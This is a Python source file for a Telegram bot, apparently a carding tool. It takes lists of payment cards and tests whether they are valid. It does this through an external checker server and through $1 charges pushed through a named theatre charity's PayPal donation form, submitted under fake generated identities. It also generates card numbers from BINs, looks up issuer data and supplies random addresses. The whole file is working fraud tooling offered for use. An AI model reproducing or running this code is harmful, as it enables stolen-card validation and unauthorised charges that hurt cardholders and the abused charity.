import os
import asyncio
import json
import random
import re
import string
import time
import urllib.parse
import urllib.request
import aiohttp
import requests
import base64
from typing import Dict, List, Optional, Tuple
from enum import Enum
from dataclasses import dataclass

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# Configuration
TELEGRAM_BOT_TOKEN = os.environ['TELEGRAM_BOT_TOKEN']

ENDPOINTS = {
    '1': ('Stripe Auth 1$', 'http://135.148.14.197:5000/stripe1$?cc={card}'),
    '2': ('Stripe Auth 5$', 'http://135.148.14.197:5000/stripe5$?cc={card}'),
    '3': ('Auto Shopify 1$', 'http://135.148.14.197:5000/shopify1$?cc={card}'),
    '4': ('PayPal CVV 1$', 'paypal_cvv')  # Special identifier for PayPal CVV
}

# User sessions
user_sessions = {}

class CheckerType(Enum):
    STRIPE_SHOPIFY = "stripe_shopify"
    PAYPAL_CVV = "paypal_cvv"

class UserSession:
    def __init__(self, user_id: int):
        self.user_id = user_id
        self.checker_type = None
        self.gateway_choice = None
        self.cards = []
        self.results = []
        self.waiting_for_cards = False

# --------------------------
# PayPal CVV Checker Implementation
# --------------------------
@dataclass(frozen=True)
class PayPalConfig:
    base_url: str = "https://atlanticcitytheatrecompany.com"
    donation_path: str = "/donations/donate/"
    ajax_endpoint: str = "/wp-admin/admin-ajax.php"
    timeout: float = 90.0

class PayPalSessionFactory:
    def __init__(self, cfg: PayPalConfig):
        self._cfg = cfg

    async def build(self) -> aiohttp.ClientSession:
        return aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self._cfg.timeout))

@dataclass(frozen=True)
class PayPalFormContext:
    hash: str
    prefix: str
    form_id: str
    access_token: str

class PayPalDonationFacade:
    def __init__(self, client: aiohttp.ClientSession, cfg: PayPalConfig):
        self._client = client
        self._cfg = cfg
        self._faker = Faker()
        self._ctx: Optional[PayPalFormContext] = None

    async def _fetch_initial_page(self) -> str:
        url = f"{self._cfg.base_url}{self._cfg.donation_path}"
        async with self._client.get(url) as resp:
            resp.raise_for_status()
            return await resp.text()

    def _extract_context(self, html: str) -> PayPalFormContext:
        hash_ = self._re_search(r'name="give-form-hash" value="(.*?)"', html)
        prefix = self._re_search(r'name="give-form-id-prefix" value="(.*?)"', html)
        form_id = self._re_search(r'name="give-form-id" value="(.*?)"', html)
        enc_token = self._re_search(r'"data-client-token":"(.*?)"', html)
        dec = base64.b64decode(enc_token).decode('utf-8')
        access_token = self._re_search(r'"accessToken":"(.*?)"', dec)
        return PayPalFormContext(hash_, prefix, form_id, access_token)

    @staticmethod
    def _re_search(pattern: str, text: str) -> str:
        match = re.search(pattern, text)
        if not match:
            raise ValueError(f"Pattern not found: {pattern}")
        return match.group(1)

    async def _init_context(self) -> None:
        html = await self._fetch_initial_page()
        self._ctx = self._extract_context(html)

    def _generate_profile(self) -> Dict[str, str]:
        first = self._faker.first_name()
        last = self._faker.last_name()
        num = random.randint(100, 999)
        return {
            "first_name": first,
            "last_name": last,
            "email": f"{first.lower()}{last.lower()}{num}@gmail.com",
            "address1": self._faker.street_address(),
            "address2": f"{random.choice(['Apt', 'Unit', 'Suite'])} {random.randint(1, 999)}",
            "city": self._faker.city(),
            "state": self._faker.state_abbr(),
            "zip": self._faker.zipcode(),
            "card_name": f"{first} {last}",
        }

    def _build_form_data(self, profile: Dict[str, str], amount: str) -> Dict[str, str]:
        return {
            "give-honeypot": "",
            "give-form-id-prefix": self._ctx.prefix,
            "give-form-id": self._ctx.form_id,
            "give-form-title": "",
            "give-current-url": f"{self._cfg.base_url}{self._cfg.donation_path}",
            "give-form-url": f"{self._cfg.base_url}{self._cfg.donation_path}",
            "give-form-minimum": amount,
            "give-form-maximum": "999999.99",
            "give-form-hash": self._ctx.hash,
            "give-price-id": "custom",
            "give-amount": amount,
            "give_stripe_payment_method": "",
            "payment-mode": "paypal-commerce",
            "give_first": profile["first_name"],
            "give_last": profile["last_name"],
            "give_email": profile["email"],
            "give_comment": "",
            "card_name": profile["card_name"],
            "billing_country": "US",
            "card_address": profile["address1"],
            "card_address_2": profile["address2"],
            "card_city": profile["city"],
            "card_state": profile["state"],
            "card_zip": profile["zip"],
            "give-gateway": "paypal-commerce",
        }

    async def _create_order(self, profile: Dict[str, str], amount: str) -> str:
        form_data = self._build_form_data(profile, amount)
        async with self._client.post(
            f"{self._cfg.base_url}{self._cfg.ajax_endpoint}",
            params={"action": "give_paypal_commerce_create_order"},
            data=form_data
        ) as resp:
            resp.raise_for_status()
            data = await resp.json()
            return data["data"]["id"]

    async def _confirm_payment(self, order_id: str, card: Tuple[str, str, str, str]) -> Dict:
        n, m, y, cvv = card
        y = y[-2:]
        payload = {
            "payment_source": {
                "card": {
                    "number": n,
                    "expiry": f"20{y}-{m.zfill(2)}",
                    "security_code": cvv,
                    "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}},
                }
            },
            "application_context": {"vault": False},
        }
        headers = {
            "Authorization": f"Bearer {self._ctx.access_token}",
            "Content-Type": "application/json",
        }
        
        async with self._client.post(
            f"https://api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
            json=payload,
            headers=headers
        ) as resp:
            return await resp.json()

    async def _approve_order(self, order_id: str, profile: Dict[str, str], amount: str) -> Dict[str, any]:
        form_data = self._build_form_data(profile, amount)
        async with self._client.post(
            f"{self._cfg.base_url}{self._cfg.ajax_endpoint}",
            params={"action": "give_paypal_commerce_approve_order", "order": order_id},
            data=form_data
        ) as resp:
            resp.raise_for_status()
            return await resp.json()

    async def execute(self, raw_card: str, amount: str = "1") -> str:
        if not self._ctx:
            await self._init_context()

        card_parts = raw_card.split("|")
        if len(card_parts) != 4:
            return "Invalid Card Format"

        card = tuple(card_parts)
        profile = self._generate_profile()
        
        try:
            order_id = await self._create_order(profile, amount)
            await self._confirm_payment(order_id, card)
            result = await self._approve_order(order_id, profile, amount)
            return self._parse_result(result, amount)
        except Exception as e:
            return f"Payment Error: {str(e)}"

    @staticmethod
    def _parse_result(data: Dict[str, any], amount: str) -> str:
        if data.get("success"):
            return f"APPROVED - CHARGED ${amount}"

        text = str(data)
        if "'data': {'error': ' " in text:
            status = text.split("'data': {'error': ' ")[1].split('.')[0]
        elif "'details': [{'issue': '" in text:
            status = text.split("'details': [{'issue': '")[1].split("'")[0]
        elif "issuer is not certified. " in text:
            status = text.split("issuer is not certified. ")[1].split('.')[0]
        elif "system is unavailable.  " in text:
            status = text.split("system is unavailable. ")[1].split('.')[0]
        elif "C does not match. " in text:
            status = text.split("not match. ")[1].split('.')[0]
        elif "service is not supported. " in text:
            status = text.split("service is not supported. ")[1].split('.')[0]
        elif "'data': {'error': '" in text:
            status = text.split("'data': {'error': '")[1].split('.')[0]
        else:
            status = "DECLINED - Payment failed"
        
        sta = status.replace(' ', '').replace('_', ' ').title()
        return f"DECLINED - {sta}"

class PayPalCvvProcessor:
    def __init__(self):
        self._cfg = PayPalConfig()
        self._session_factory = PayPalSessionFactory(self._cfg)

    async def process(self, card: str, attempts: int = 2) -> str:
        for attempt in range(attempts):
            try:
                client = await self._session_factory.build()
                facade = PayPalDonationFacade(client, self._cfg)
                result = await facade.execute(card)
                await client.close()
                return result
            except Exception as e:
                if attempt == attempts - 1:
                    return f"ERROR - {str(e)[:100]}"
                await asyncio.sleep(1)
        return "ERROR - Max attempts reached"

# --------------------------
# BIN Info Functions
# --------------------------
def fetch_bin_info(bin_number: str) -> Tuple[str, str, str]:
    """Fetch BIN information"""
    try:
        url = f"https://bins.antipublic.cc/bins/{bin_number[:6]}"
        response = requests.get(url, timeout=10)
        data = response.json()

        if "bin" not in data:
            return "Unknown - Unknown - Unknown", "Unknown Bank", "Unknown Country 🏳️"

        brand = data.get("brand", "Unknown")
        card_type = data.get("type", "Unknown")
        level = data.get("level", "Unknown")
        bank = data.get("bank", "Unknown Bank")
        country = data.get("country_name", "Unknown Country")
        flag = data.get("country_flag", "🏳️")

        return f"{brand} - {card_type} - {level}", bank, f"{country} {flag}"
    
    except Exception:
        return "Unknown - Unknown - Unknown", "Unknown Bank", "Unknown Country 🏳️"

# --------------------------
# Card Generation Functions
# --------------------------
def generate_cc(bin_pattern: str, amount: int = 10, exp_month: str = "rnd", exp_year: str = "rnd", cvv: str = "rnd") -> List[str]:
    """Generate credit cards"""
    cards = []
    
    for _ in range(amount):
        # Fill missing BIN digits
        cc_number = "".join(str(random.randint(0, 9)) if x == "x" else x for x in bin_pattern)
        while len(cc_number) < 16:
            cc_number += str(random.randint(0, 9))

        # Handle expiration month
        month = str(random.randint(1, 12)).zfill(2) if exp_month in ["rnd", "xxx"] else exp_month

        # Handle expiration year
        year = str(random.randint(26, 34)) if exp_year in ["rnd", "xxx"] else exp_year

        # Handle CVV
        cvv_code = str(random.randint(100, 999)) if cvv in ["rnd", "xxx"] else cvv

        cards.append(f"{cc_number}|{month}|20{year}|{cvv_code}")
    
    return cards

# --------------------------
# Address Generation Functions
# --------------------------
async def fetch_address(country_code: str) -> str:
    """Fetch random address"""
    url = f"https://randomuser.me/api/?nat={country_code}"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url) as response:
                if response.status != 200:
                    return f"❌ Error: Received status code {response.status}"
                
                data = await response.json()
                if not data.get('results'):
                    return "❌ Error: No results found"
                
                user = data['results'][0]
                name = f"{user['name']['first']} {user['name']['last']}"
                street = f"{user['location']['street']['number']} {user['location']['street']['name']}"
                city = user['location']['city']
                state = user['location']['state']
                pincode = user['location']['postcode']
                phone = user['phone']
                dob = user['dob']['date'].split('T')[0]
                country = user['location']['country']
                
                return f"""𝗡𝗮𝗺𝗲   ⇾ {name}
𝗔𝗱𝗱𝗿𝗲𝘀𝘀 ⇾ {street}
𝗖𝗶𝘁𝘆   ⇾ {city}
𝗦𝘁𝗮𝘁𝗲  ⇾ {state}
𝗣𝗶𝗻𝗰𝗼𝗱𝗲 ⇾ {pincode}
𝗣𝗵𝗼𝗻𝗲 ⇾ {phone}
𝗗𝗢𝗕   ⇾ {dob}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {country}"""
        except Exception as e:
            return f"❌ Error: {str(e)}"

# --------------------------
# Card Checking Functions
# --------------------------
def make_api_request(url: str) -> Dict:
    """Make API request to checker endpoint"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*'
        }
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=30) as resp:
            body = resp.read().decode('utf-8', errors='replace')
            return {'status': 'success', 'http_code': resp.getcode(), 'body': body}
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

async def check_single_card(card: str, gateway_name: str, base_url: str) -> Dict:
    """Check a single card and return formatted result"""
    try:
        # Handle PayPal CVV separately
        if base_url == "paypal_cvv":
            paypal_processor = PayPalCvvProcessor()
            result_text = await paypal_processor.process(card)
            
            # Parse PayPal result
            if "APPROVED" in result_text:
                status = "APPROVED"
                status_emoji = "✅"
                message = result_text
            elif "DECLINED" in result_text:
                status = "DECLINED"
                status_emoji = "❌"
                message = result_text
            else:
                status = "ERROR"
                status_emoji = "⚠️"
                message = result_text
        else:
            # Handle regular API endpoints
            encoded_card = urllib.parse.quote_plus(card)
            url = base_url.format(card=encoded_card)
            
            # Make API request
            response = await asyncio.to_thread(make_api_request, url)
            
            if response['status'] == 'success':
                try:
                    data = json.loads(response['body'])
                    
                    # Extract response message
                    if isinstance(data, dict):
                        if 'response' in data:
                            resp_data = data['response']
                            if isinstance(resp_data, dict):
                                message = resp_data.get('message', str(resp_data))
                            else:
                                message = str(resp_data)
                        else:
                            message = str(data)
                    else:
                        message = str(data)
                    
                    # Determine status
                    message_upper = message.upper()
                    if any(word in message_upper for word in ['APPROVED', 'CHARGED', 'SUCCESS', 'AUTHORIZED']):
                        status = "APPROVED"
                        status_emoji = "✅"
                    elif any(word in message_upper for word in ['DECLINED', 'FAILED', 'ERROR', 'INVALID']):
                        status = "DECLINED"
                        status_emoji = "❌"
                    else:
                        status = "UNKNOWN"
                        status_emoji = "⚠️"
                except json.JSONDecodeError:
                    # Handle non-JSON responses
                    message = response['body'][:200]
                    status = "UNKNOWN"
                    status_emoji = "⚠️"
            else:
                status = "ERROR"
                status_emoji = "❌"
                message = f"API Error: {response['message']}"
        
        # Extract BIN info
        bin_number = card.split('|')[0][:6]
        bin_info, bank, country = fetch_bin_info(bin_number)
        
        # Format the result exactly like the screenshot
        card_parts = card.split('|')
        card_number = card_parts[0]
        exp_year = card_parts[2][2:] if len(card_parts) > 2 else "??"
        exp_month = card_parts[1] if len(card_parts) > 1 else "??"
        
        result_text = f"""CC → {card_number}
{exp_year}/{exp_month}  

Response → {message}

Gateway → {gateway_name}

BIN Info: {bin_info}

Bank: {bank}

Country: {country}"""
        
        return {
            'card': card,
            'status': status,
            'status_emoji': status_emoji,
            'message': message,
            'gateway': gateway_name,
            'bin_info': bin_info,
            'bank': bank,
            'country': country,
            'formatted_text': result_text,
            'success': True
        }
            
    except Exception as e:
        return {
            'card': card,
            'status': "ERROR",
            'status_emoji': "❌",
            'message': f"Check Error: {str(e)}",
            'gateway': gateway_name,
            'bin_info': "Unknown - Unknown - Unknown",
            'bank': "Unknown Bank",
            'country': "Unknown Country 🏳️",
            'formatted_text': f"Error: {str(e)}",
            'success': False
        }

async def process_cards(session: UserSession):
    """Process all cards in session"""
    gateway_name, base_url = ENDPOINTS[session.gateway_choice]
    results = []
    
    # Process cards sequentially with delay
    for i, card in enumerate(session.cards, 1):
        # Check card
        result = await check_single_card(card, gateway_name, base_url)
        results.append(result)
        
        # Small delay between requests to avoid rate limiting
        if i < len(session.cards):
            await asyncio.sleep(2)
    
    return results

# --------------------------
# Telegram Handlers
# --------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_sessions[user_id] = UserSession(user_id)
    
    welcome_text = """
🤖 *Advanced Card Checker Bot* 🚀

*Available Commands:*
/start - Start bot
/check - Check cards  
/gen - Generate cards
/info - BIN information
/address - Get random address
/help - Help guide

*Card Formats:*
- Card number only: `4111111111111111`
- Full format: `4111111111111111|12|2025|123`

Click buttons below to get started! 🎯
    """
    
    keyboard = [
        [InlineKeyboardButton("🔍 Check Cards", callback_data="start_check")],
        [InlineKeyboardButton("🔄 Generate Cards", callback_data="generate_cards")],
        [InlineKeyboardButton("ℹ️ BIN Info", callback_data="bin_info")],
        [InlineKeyboardButton("🏠 Address", callback_data="get_address")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=reply_markup)

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        user_sessions[user_id] = UserSession(user_id)
    
    session = user_sessions[user_id]
    session.cards = []
    session.waiting_for_cards = False
    
    keyboard = [
        [InlineKeyboardButton("Stripe Auth 1$", callback_data="gateway_1")],
        [InlineKeyboardButton("Stripe Auth 5$", callback_data="gateway_2")],
        [InlineKeyboardButton("Shopify 1$", callback_data="gateway_3")],
        [InlineKeyboardButton("PayPal CVV 1$", callback_data="gateway_4")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🛠 *Select Gateway:*\n\nChoose the payment gateway to check cards:",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def handle_cards_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        return
    
    session = user_sessions[user_id]
    
    if not session.waiting_for_cards:
        await update.message.reply_text("Please use /check to start checking cards.")
        return
    
    text = update.message.text.strip()
    
    if text.lower() == 'done':
        if not session.cards:
            await update.message.reply_text("No cards provided. Use /check to try again.")
            session.waiting_for_cards = False
            return
        
        # Process cards
        processing_msg = await update.message.reply_text(f"🔄 Processing {len(session.cards)} cards...")
        
        try:
            results = await process_cards(session)
            session.results = results
            
            # Send individual results
            approved_count = 0
            for result in results:
                await update.message.reply_text(result['formatted_text'])
                if result['status'] == 'APPROVED':
                    approved_count += 1
                await asyncio.sleep(0.5)  # Small delay between messages
            
            # Send summary
            summary = f"""
📊 *Check Complete*

✅ Approved: {approved_count}
❌ Declined: {len(results) - approved_count}
⚠️ Errors: {len([r for r in results if r['status'] == 'ERROR'])}
🎯 Total: {len(results)}
            """
            await update.message.reply_text(summary, parse_mode='Markdown')
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error processing cards: {str(e)}")
        
        session.waiting_for_cards = False
    
    else:
        # Add card to session
        if '|' in text:
            # Full format: card|mm|yyyy|cvv
            session.cards.append(text)
        else:
            # Card number only - add random expiration and CVV
            month = str(random.randint(1, 12)).zfill(2)
            year = str(random.randint(26, 34))
            cvv = str(random.randint(100, 999))
            session.cards.append(f"{text}|{month}|20{year}|{cvv}")
        
        await update.message.reply_text(
            f"✅ Card added ({len(session.cards)} total). Send more cards or 'done' to start checking."
        )

# Card Generation Handler
async def generate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /gen command"""
    try:
        parts = update.message.text.split()
        if len(parts) < 2:
            await update.message.reply_text(
                "Usage: /gen <BIN> or /gen <BIN>|<MM>|<YY>|<CVV>\n"
                "Examples:\n"
                "/gen 411773\n"
                "/gen 411773|rnd|rnd|rnd\n"
                "/gen 411773|12|2025|123"
            )
            return

        user_input = parts[1].split("|")
        bin_pattern = user_input[0]

        # Extract parameters
        exp_month = user_input[1] if len(user_input) > 1 else "rnd"
        exp_year = user_input[2] if len(user_input) > 2 else "rnd"
        cvv = user_input[3] if len(user_input) > 3 else "rnd"

        # Validate BIN
        if not re.match(r"^\d{3,}$", bin_pattern.replace("x", "0")):
            await update.message.reply_text("❌ Invalid BIN! Must be at least 3 digits (use 'x' for random digits).")
            return

        # Generate cards
        cc_list = generate_cc(bin_pattern, exp_month=exp_month, exp_year=exp_year, cvv=cvv)
        bin_info, bank, country = fetch_bin_info(bin_pattern)

        response = f"""𝗕𝗜𝗡 ⇾ {bin_pattern}
𝗔𝗺𝗼𝘂𝗻𝘁 ⇾ 10

""" + "\n".join(cc_list) + f"""

𝗜𝗻𝗳𝗼: {bin_info}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
"""
        await update.message.reply_text(response)
    
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

# BIN Info Handler
async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /info command"""
    try:
        parts = update.message.text.split()
        if len(parts) != 2:
            await update.message.reply_text("Usage: /info <BIN>\nExample: /info 411773")
            return
        
        bin_number = parts[1]
        if not bin_number.isdigit() or len(bin_number) < 6:
            await update.message.reply_text("❌ Invalid BIN! Must be at least 6 digits.")
            return
        
        bin_info, bank, country = fetch_bin_info(bin_number)

        response = f"""𝗕𝗜𝗡 ⇾ {bin_number}

𝗜𝗻𝗳𝗼: {bin_info}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝘁𝗿𝘆: {country}"""
        
        await update.message.reply_text(response)

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

# Address Handler
async def address_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /address command"""
    parts = update.message.text.split()
    if len(parts) != 2:
        await update.message.reply_text("❌ Usage: /address <country_code>\nExample: /address US")
        return
    
    country_code = parts[1].upper()
    address_info = await fetch_address(country_code)
    await update.message.reply_text(address_info)

# Button Handler
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if user_id not in user_sessions:
        user_sessions[user_id] = UserSession(user_id)
    
    session = user_sessions[user_id]
    data = query.data
    
    if data == "main_menu":
        await start(query, context)
        return
        
    elif data == "start_check":
        await check_command(query, context)
        return
        
    elif data == "generate_cards":
        await query.edit_message_text(
            "🔄 *Generate Cards*\n\n"
            "Use: `/gen <BIN>|<MM>|<YY>|<CVV>`\n\n"
            "Examples:\n"
            "`/gen 411773`\n"
            "`/gen 411773|rnd|rnd|rnd`\n"
            "`/gen 411773|12|2025|123`\n\n"
            "Use 'rnd' for random values.",
            parse_mode='Markdown'
        )
        return
        
    elif data == "bin_info":
        await query.edit_message_text(
            "🔍 *BIN Information*\n\n"
            "Use: `/info <BIN>`\n\n"
            "Example: `/info 411773`\n\n"
            "Get information about any 6+ digit BIN.",
            parse_mode='Markdown'
        )
        return
        
    elif data == "get_address":
        await query.edit_message_text(
            "🏠 *Random Address*\n\n"
            "Use: `/address <country_code>`\n\n"
            "Examples:\n"
            "`/address US` - United States\n"
            "`/address GB` - United Kingdom\n"
            "`/address CA` - Canada\n"
            "`/address AU` - Australia",
            parse_mode='Markdown'
        )
        return
        
    elif data.startswith("gateway_"):
        gateway_num = data.split("_")[1]
        session.gateway_choice = gateway_num
        session.checker_type = CheckerType.STRIPE_SHOPIFY if gateway_num != '4' else CheckerType.PAYPAL_CVV
        gateway_name = ENDPOINTS[gateway_num][0]
        
        await query.edit_message_text(
            f"🎯 *{gateway_name}*\n\n"
            "Please paste your cards (one per line):\n\n"
            "*Formats:*\n"
            "• `card_number` (random exp/CVV will be added)\n"
            "• `card_number|mm|yyyy|cvv` (full format)\n\n"
            "*Examples:*\n"
            "`4111111111111111`\n"
            "`4111111111111111|12|2025|123`\n\n"
            "Send 'done' when finished.",
            parse_mode='Markdown'
        )
        session.waiting_for_cards = True

# Help Command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
📖 *Help Guide*

*Commands:*
/start - Start bot & main menu
/check - Check cards against gateways
/gen - Generate random cards
/info - Get BIN information  
/address - Get random address
/help - This help message

*Card Checking:*
1. Use /check or click 'Check Cards'
2. Select gateway
3. Paste cards (one per line)
4. Send 'done' to start checking
5. Get individual results + summary

*Card Generation:*
/gen 411773 - 10 cards with random details
/gen 411773|rnd|rnd|rnd - Same as above
/gen 411773|12|2025|123 - Specific details

*Supported Gateways:*
• Stripe Auth 1$
• Stripe Auth 5$ 
• Shopify 1$
• PayPal CVV 1$ (Working!)
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')

# Error Handler
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Update {update} caused error {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text("❌ An error occurred. Please try again.")

# Main Application
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("check", check_command))
    application.add_handler(CommandHandler("gen", generate_command))
    application.add_handler(CommandHandler("info", info_command))
    application.add_handler(CommandHandler("address", address_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cards_input))
    application.add_error_handler(error_handler)
    
    print("🤖 Bot is running with WORKING PayPal CVV...")
    application.run_polling()

if __name__ == "__main__":
    main()
